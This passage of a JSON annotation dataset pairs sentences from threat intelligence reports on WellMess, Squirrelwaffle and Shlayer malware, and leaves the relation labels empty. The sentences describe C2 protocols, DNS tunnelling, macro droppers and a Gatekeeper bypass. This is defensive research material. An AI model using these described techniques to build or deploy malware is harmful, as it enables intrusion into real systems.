        "S2": "A value of C in the head tag will check a <;title;> tag for the number of chunks the C2 wants to send to the malware and will receive data and store it for later use until the title tag value in a received message matches the desired number of chunks from the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S33<=>S37",
        "S1": "If the response from the C2 contains a value of p in the service tag received, then the malware will generate a new AES key and send it to the C2 in the same way as during the initial connection to the C2.",
        "S2": "The service tag values, except for p, are used when interpreting the content of the data sent to the malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S36<=>S38",
        "S1": "This method will be used when the C2 wishes to send a large amount of data to the malware but does not want to alert network monitoring tools that a large data transfer is occurring.",
        "S2": "The content of the data is stored in the Content segment of the 200 OK responses from the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S37<=>S40",
        "S1": "The service tag values, except for p, are used when interpreting the content of the data sent to the malware.",
        "S2": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S40<=>S44",
        "S1": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "S2": "The tag is split using the \u2018|\u2019 character and if the filepath parameter is present, then the data is written to a file using that parameter as the file name and path.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S40<=>S42",
        "S1": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "S2": "The fu commands take the contents of the response from the C2 as the file to write and parses the service tag for the file name and path to use.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S40<=>S45",
        "S1": "Once all the data has been received and decoded from the C2, the malware will call a function called botlib.Work which is responsible for the malicious behaviour of this malware.",
        "S2": "If the path is not present, then the malware instead writes the file to the current directory the malware is in with a file name of upload.filename.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S41<=>S46",
        "S1": "This function handles the u, m, hi, fu, fd and pr service tags as well as having a default case where the service tag does not contain any data.",
        "S2": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S42<=>S46",
        "S1": "The fu commands take the contents of the response from the C2 as the file to write and parses the service tag for the file name and path to use.",
        "S2": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S44<=>S46",
        "S1": "The tag is split using the \u2018|\u2019 character and if the filepath parameter is present, then the data is written to a file using that parameter as the file name and path.",
        "S2": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S46<=>S49",
        "S1": "The fd command uses the same format to find the file to send to the C2; however, if the filepath parameter is not present the malware will look for a file in the current folder called download.filename.",
        "S2": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S49<=>S62",
        "S1": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "S2": "When looking at the certificates embedded in the samples, it appears that the threat actor uses a self-signed certificate authority to sign both the C2 and the malware\u2019s certificates.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S49<=>S54",
        "S1": "The default case when the service tag is empty allows the malware to treat the contents of the response from the C2 as a command to execute via the Go library functions os.exec.Command or os.exec.Start.",
        "S2": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S50<=>S52",
        "S1": "The format of the received command is checked against the below regex pattern for validity before executing and the command is read from the body of the message received from the C2.",
        "S2": "When the backdoor is configured to use HTTPS to communicate with the C2, the functionality is largely the same as when in HTTP mode.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S52<=>S55",
        "S1": "When the backdoor is configured to use HTTPS to communicate with the C2, the functionality is largely the same as when in HTTP mode.",
        "S2": "The hello message that is sent contains the same plaintext data as the HTTP mode.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S53<=>S59",
        "S1": "The differences are that it lacks the options to update a session key due to encryption being handled by the TLS layer and it also does not have the option to send data to and from the C2 in the chunking mode previously described.",
        "S2": "Usually TLS operates in simple mode, which only requires a server to carry out authentication.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S54<=>S58",
        "S1": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "S2": "The malware secures the communications between itself and the C2 by implementing a feature called mutual TLS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S54<=>S57",
        "S1": "In addition, only one transmission is made to the C2 when the malware is establishing a connection as there is no exchange of an AES session key.",
        "S2": "The communication pattern between the victim and the C2 also follows the same pattern as described in Figure 2 but the outer layers of obfuscating the data and RSA encryption are removed due to the TLS protocol handling the encryption.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S58<=>S60",
        "S1": "The malware secures the communications between itself and the C2 by implementing a feature called mutual TLS.",
        "S2": "Mutual TLS means the malware has a trusted SSL certificate hardcoded in its binary that it uses to check the certificate provided by the C2; the malware also forwards its own hardcoded certificate to the C2 that the C2 checks.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S59<=>S61",
        "S1": "Usually TLS operates in simple mode, which only requires a server to carry out authentication.",
        "S2": "So long as both the C2 and the malware accept the provided certificates then communications will be encrypted using TLS, otherwise the connection will be rejected and the malware will not be able to communicate with the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S60<=>S63",
        "S1": "Mutual TLS means the malware has a trusted SSL certificate hardcoded in its binary that it uses to check the certificate provided by the C2; the malware also forwards its own hardcoded certificate to the C2 that the C2 checks.",
        "S2": "The WellMess malware stores the C2 IP addresses it uses in the binary as a plaintext url.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S63<=>S65",
        "S1": "The WellMess malware stores the C2 IP addresses it uses in the binary as a plaintext url.",
        "S2": "This pattern can be used to identify numerous samples of the WellMess backdoor.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S64<=>S67",
        "S1": "The format of the C2 url string for the example in Figure 3 would be one of:",
        "S2": "Data is sent to the C2 by DNS tunnelling.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S65<=>S72",
        "S1": "This pattern can be used to identify numerous samples of the WellMess backdoor.",
        "S2": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S69<=>S75",
        "S1": "The implementation of DNS tunnelling in this sample uses A records to send data to the C2 and then uses TXT records to receive commands during its main loop.",
        "S2": "As this sample did not have DNS functionality enabled, the key was not configured in this binary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S70<=>S72",
        "S1": "The initial message sent to the C2 consists of the current time printed in DD/MM/YYYY HH:MM:SS AM/PM format.",
        "S2": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S71<=>S76",
        "S1": "This is then encoded using a non-standard base32 encoding with an alphabet of ybndrfg8ejkmcpqxot1uwisza345h769.",
        "S2": "The result of the RC4 operation is then encoded using the base32 encoding and then that is split into a period-separated string with each chunk a random length.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S72<=>S81",
        "S1": "This time value is then used throughout the execution of the malware as part of the DNS beacon message to the C2.",
        "S2": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S74<=>S76",
        "S1": "It then gzips and RC4 encrypts the previously generated MD5 hash string using a hardcoded key.",
        "S2": "The result of the RC4 operation is then encoded using the base32 encoding and then that is split into a period-separated string with each chunk a random length.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S81<=>S84",
        "S1": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "S2": "When sending beacons during the main loop in DNS mode the malware will generate two base64 encoded strings from seven random bytes each and join them with a period to the command rc.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S81<=>S83",
        "S1": "The whole message is then prepended with a sequence identifier in case the malware needs more than one DNS request to fit the information in.",
        "S2": "As can be seen in the above examples, even when the contents of the message change, the part of the URL relating to the MD5 hash remains consistent albeit with different length chunks for each send.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S86<=>S91",
        "S1": "Finally, it will append another 10 base64 encoded strings, each generated from 7 random bytes.",
        "S2": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S87<=>S89",
        "S1": "Finally the C2 domain is appended to the string and this is sent to the C2 as a DNS TXT request.",
        "S2": "The first specifies the command that is being sent from the C2 and can be either of C or G.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S89<=>S91",
        "S1": "The first specifies the command that is being sent from the C2 and can be either of C or G.",
        "S2": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-527.md::S91<=>S93",
        "S1": "If the first command does not match either of these values then the malware reads the data from the third TXT record, decodes it using the custom base32 algorithm, RC4 decrypts the result, then gzip decompresses the data to give the final data to be used.",
        "S2": "The com option calls the same functions as the default case in the HTTP and HTTPS modes which allows the malware to run a cmd shell but then exfiltrates the output via DNS A records.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S0<=>S11",
        "S1": "Squirrelwaffle campaigns generally start via spam emails that attempt to convince victims to click an embedded URL using a technique known as email thread hijacking.",
        "S2": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S5<=>S7",
        "S1": "This document is using a DocuSign template lure that instructs the user to enable a macro to view the content (as shown in Figure 2).",
        "S2": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S7<=>S10",
        "S1": "Once the user enables the macro, an AutoOpen() subroutine is called which then executes a malicious Visual Basic Application (VBA) macro.",
        "S2": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S10<=>S12",
        "S1": "The document that contains the macro code leverages cscript.exe to extract the embedded VBS file, which is written to the %ProgramData% folder, and executed using wscript.exe.",
        "S2": "The payload is written to %ProgramData% with the filename ww1.dll.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S11<=>S13",
        "S1": "This VBS file contains an obfuscated PowerShell script with 5 different URLs to download the Squirrelwaffle payload as shown in Figure 3.",
        "S2": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S12<=>S14",
        "S1": "The payload is written to %ProgramData% with the filename ww1.dll.",
        "S2": "The payload DLL is executed via rundll32.exe by invoking the export function name ldr.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S13<=>S15",
        "S1": "The VBS file simply uses the IEX (Invoke-Expression) function to download the Squirrelwaffle loader.",
        "S2": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S14<=>S25",
        "S1": "The payload DLL is executed via rundll32.exe by invoking the export function name ldr.",
        "S2": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S15<=>S17",
        "S1": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle are shown below:",
        "S2": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S16<=>S22",
        "S1": "The threat actor behind these campaigns has changed some of their TTPs over time.",
        "S2": "The threat actor also changed the location where the payload is written to disk.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S17<=>S25",
        "S1": "Recently, the initial infection vector has used hidden Microsoft Excel sheets with an Auto_Open() macro, which downloads the Squirrelwafle loader from three different URLs.",
        "S2": "Once the Squirrelwaffle payload is downloaded, it will either be executed via rundll32.exe or regsvr.exe depending upon the initial infection vector that was used to download the payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S18<=>S23",
        "S1": "The Squirrelwaffle loader is subsequently executed via regsvr32.exe.",
        "S2": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S19<=>S23",
        "S1": "An example for this campaign shown in Figure 6, used a Microsoft Excel document with the MD5 hash 77BD39191FDC817F2F14F0462BFF8D86 and a filename matching the regular expression diagram-\\d{1,9}.xls.",
        "S2": "Example (sanitized) URLs that were used to retrieve Squirrelwaffle from this campaign are shown below:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S27<=>S29",
        "S1": "The Squirrelwaffle loader is a 32-bit DLL, which is packed with a custom packer.",
        "S2": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S29<=>S32",
        "S1": "Squirrelwaffle contains a hardcoded configuration that is encrypted in the binary.",
        "S2": "An example formatted Squirrelwaffle configuration is shown in Figure 10.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S37<=>S44",
        "S1": "The path of the HTTP POST request consists of a hardcoded prefix and a Base64 encoded string that is encrypted using the same XOR-based algorithm and key as described above.",
        "S2": "This payload is also encrypted with the same XOR-based algorithm and key as the HTTP POST path component.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S38<=>S46",
        "S1": "This encoded string includes an alphanumeric string with a random length between 1 and 28 characters followed by the IP address of the system.",
        "S2": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S41<=>S46",
        "S1": "The HTTP POST body contains another Base64 encoded string that includes the victim\u2019s computer name, username, application data directory, and workgroup.",
        "S2": "These fields include a status code, a timestamp, the external IP address of the system, along with the victim\u2019s system information that was previously sent.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S45<=>S48",
        "S1": "The SquirrelWaffle CnC responds with a Base64 encoded payload that uses the same encryption schema with another format that uses two tab characters as delimiter between fields.",
        "S2": "The SquirrelWaffle CnC response may also contain a second-stage payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S48<=>S50",
        "S1": "The SquirrelWaffle CnC response may also contain a second-stage payload.",
        "S2": "This second-stage payload will be written to a filename that consists of eleven random alphanumeric characters appended with a .txt extension, and then executed by SquirrelWaffle.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S52<=>S54",
        "S1": "This file is packed and decrypted in memory to produce a Cobalt Strike stager with the MD5 hash 38DB72B33ABCEA250F5B7CB5AB514B2C, which further downloads the Cobalt Strike beacon.",
        "S2": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-558.md::S54<=>S56",
        "S1": "The Cobalt Strike CnC server responds with a jQuery file with the encrypted Cobalt Strike beacon embedded as binary data in the middle of the file as shown in Figure 12.",
        "S2": "The Cobalt Strike beacon observed by Zscaler ThreatLabz contains the following CnC servers:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S1<=>S11",
        "S1": "Whether you receive the malware or a generic advertisement from the compromised domain depends on your browser\u2019s user-agent string, IP address, and relative last visit.",
        "S2": "To this point, all discovered samples of this malware have targeted only macOS.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S2<=>S10",
        "S1": "Given this determination, TAU developed a script to rotate through proxies, visit the main advertisement domain (in this example case, dubbeldachs[.]com), follow through all redirects, detect if the site is malicious or not, capture a screenshot + page source + malware payload, and categorize the data.",
        "S2": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S4<=>S9",
        "S1": "Running this script across multiple systems, we were able to capture over 50 unique samples in a matter of hours, all targeted towards macOS.",
        "S2": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S4<=>S10",
        "S1": "Running this script across multiple systems, we were able to capture over 50 unique samples in a matter of hours, all targeted towards macOS.",
        "S2": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S6<=>S9",
        "S1": "The following screenshot illustrates a sample delivery site typical of Shlayer (and other adware):",
        "S2": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S9<=>S54",
        "S1": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "S2": "However, unlike files downloaded from a web browser, when a file is downloaded via the command line utility curl, the quarantine attribute flag required for Gatekeeper\u2019s check is not added to the file.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S9<=>S14",
        "S1": "Although the distribution sites vary in theme and delivery method, we observed the resulting payload ultimately installed a variant of Shlayer.",
        "S2": "Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S10<=>S16",
        "S1": "Samples discovered by TAU have been seen to affect versions of macOS from 10.10.5 to 10.14.3 as of December 2019.",
        "S2": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S11<=>S13",
        "S1": "To this point, all discovered samples of this malware have targeted only macOS.",
        "S2": "Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S12<=>S16",
        "S1": "The malware employs multiple levels of obfuscation and is capable of privilege escalation.",
        "S2": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S13<=>S29",
        "S1": "Many of the initial DMGs are signed with a legitimate Apple developer ID and use legitimate system applications via bash to conduct all installation activities.",
        "S2": "- Collects system information such as the macOS version and IOPlatformUUID (a unique identifier for the system)",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S14<=>S48",
        "S1": "Although most samples were DMG files, we also discovered .pkg, .iso, and .zip payloads.",
        "S2": "Since the time of our first reporting earlier last year however, Apple introduced additional security measures to both the registration of developer IDs as well as the execution of kernel extensions.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S16<=>S64",
        "S1": "Note: There are many other samples found by TAU that appear to be variations of this malware, masquerading as pirated software \u2013 these variations may have different application paths.",
        "S2": "Due to the number of known IOCs for this malware",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S18<=>S75",
        "S1": "The samples collected and analyzed by TAU that were derived from pirated software have a nearly identical execution chain as the traditional samples described below, with the exception of the command-line arguments to the curl command: curl -f0L versus curl -fsL.",
        "S2": "For more information on how Carbon Black\u2019s products protect from these threats, please see the Shlayer TAU-TIN on our user exchange.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S21<=>S46",
        "S1": "As referenced in the Delivery section above, many Shlayer infections are distributed as fake Adobe Flash Player updates from a compromised site, often packaged as a DMG file.",
        "S2": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S22<=>S28",
        "S1": "The downloaded installer is designed to look like a legitimate installation to trick the user into authenticating with their password to continue the second stage infection such as the screenshot below:",
        "S2": "The decoded script in Figure 4 above represents the final steps of the first stage of this infection, performing the following after identifying the script location (e.g. /Volumes/Player/.hidden) and performing a verification check:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S24<=>S27",
        "S1": "This script base64 decodes and AES decrypts a second script containing an additional encoded script that is subsequently executed.",
        "S2": "The second script below uses the system utilities xxd and base64 to decode a third script which ultimately performs the download of the second stage payload and initializes the final installation activity.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S27<=>S31",
        "S1": "The second script below uses the system utilities xxd and base64 to decode a third script which ultimately performs the download of the second stage payload and initializes the final installation activity.",
        "S2": "- Creates a custom URL using the information generated in the previous two steps and downloads the second stage payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S29<=>S42",
        "S1": "- Collects system information such as the macOS version and IOPlatformUUID (a unique identifier for the system)",
        "S2": "Apple Developer IDs are used to digitally sign applications with a certificate which is used by Gatekeeper on macOS as a first step in validation of a binary for safety.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S31<=>S33",
        "S1": "- Creates a custom URL using the information generated in the previous two steps and downloads the second stage payload.",
        "S2": "- Attempts to download the zip file payload using curl (with arguments of either \u201c-f0L\u201d or \u201c\u2013fsL\u201d as mentioned above)",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S34<=>S36",
        "S1": "- Creates a directory in /tmp to store the payload and unzips the password-protected payload (note: the zip password is hardcoded in the script per sample)",
        "S2": "- Executes the payload using open with the passed arguments \u201cs\u201d \u201c$session_guid\u201d and \u201c$volume_name\u201d as in the example below: open -a /tmp/dTpyJRei/Player.app \u2013args s 141CE8F5-BA78-4EA8-A941-933A076BA0EN /Volumes/Player/",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S36<=>S38",
        "S1": "- Executes the payload using open with the passed arguments \u201cs\u201d \u201c$session_guid\u201d and \u201c$volume_name\u201d as in the example below: open -a /tmp/dTpyJRei/Player.app \u2013args s 141CE8F5-BA78-4EA8-A941-933A076BA0EN /Volumes/Player/",
        "S2": "After the second stage payload is downloaded and executed, it attempts to escalate privileges with sudo using a technique invoking /usr/libexec/security_authtrampoline as discussed in Patrick Wardle\u2019s DEFCON 2017 talk \u201cDeath by 1000 Installers\u201d and now documented under MITRE ATT&CK TID 1514 (Elevated Execution with Prompt)1.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S40<=>S43",
        "S1": "This allows the allowlisted software to run without user intervention even if the system is set to disallow unknown applications downloaded from the internet.",
        "S2": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S42<=>S45",
        "S1": "Apple Developer IDs are used to digitally sign applications with a certificate which is used by Gatekeeper on macOS as a first step in validation of a binary for safety.",
        "S2": "If we examine one of the first stage Shlayer DMG packages, we can see that the initial executable that is launched by the installer is signed by a valid Apple Developer ID (in the case illustrated below, Brianna Sanchez).",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S43<=>S46",
        "S1": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "S2": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S43<=>S61",
        "S1": "When a program is downloaded from the internet, Gatekeeper runs a check to see if the if the package or application is signed, and if it is signed with a known and trusted developer ID.",
        "S2": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S46<=>S52",
        "S1": "Because this is a valid developer certificate issued by Apple, Gatekeeper will allow this software to run without prompt.",
        "S2": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S48<=>S52",
        "S1": "Since the time of our first reporting earlier last year however, Apple introduced additional security measures to both the registration of developer IDs as well as the execution of kernel extensions.",
        "S2": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S50<=>S57",
        "S1": "This is significant as Apple\u2019s form of two-factor authentication varies from typical 2FA systems which just require a verification code from an email or SMS message.",
        "S2": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S52<=>S55",
        "S1": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "S2": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S52<=>S67",
        "S1": "During our initial tracking of Shlayer, we started to run down all the \u201cfake\u201d developer IDs but soon realized that they were clearly being randomly generated and at a surprising rate \u2013 below is a very small sample out of many of the initial IDs we collected:",
        "S2": "Because of this, we recommend detection and monitoring strategies based around behavioral indicators rather than hash- or other IOC-based indicators.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S55<=>S57",
        "S1": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "S2": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S55<=>S58",
        "S1": "This allows the script above to download, unzip, and execute the Shlayer application without warning, bypassing Gatekeeper.",
        "S2": "If the signature has been revoked, the software will exit regardless of whether Gatekeeper has been successfully bypassed.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S57<=>S59",
        "S1": "Newer samples of Shlayer have been observed to perform a check for the validity of the Apple signature using spctl before execution of the final payload.",
        "S2": "Apple has been revoking these falsely created certificates for Shlayer and other common malware quickly, cutting their effective time in the wild as legitimate applications very short.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S59<=>S61",
        "S1": "Apple has been revoking these falsely created certificates for Shlayer and other common malware quickly, cutting their effective time in the wild as legitimate applications very short.",
        "S2": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S61<=>S68",
        "S1": "As of this writing, TAU has not discovered any samples of Shlayer that have been notarized, and it is highly unlikely we will be given the stringent build requirements under the new system.",
        "S2": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S64<=>S74",
        "S1": "Due to the number of known IOCs for this malware",
        "S2": "Despite these changes however, the ability to detect the early-stage behavioral indicators of this malware can easily prevent infection and protect the organization.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S68<=>S75",
        "S1": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "S2": "For more information on how Carbon Black\u2019s products protect from these threats, please see the Shlayer TAU-TIN on our user exchange.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S68<=>S71",
        "S1": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
        "S2": "This illustrates the true danger of Shlayer: although it is considered Adware, and therefore often dismissed as a lower threat, successful infections of this malware result in the entrenchment of a backdoor that allows for the installation of any software as the root user.",
        "relation": ""
    },
    {
        "id": "cti_reports_filtered/r-611.md::S68<=>S70",
        "S1": "For example, the execution of system utilities xxd, base64, openssl, curl, and unzip may be common in a typical development environment in isolation, but when seen in succession indicate Shlayer installation activity with high fidelity in our observation.",
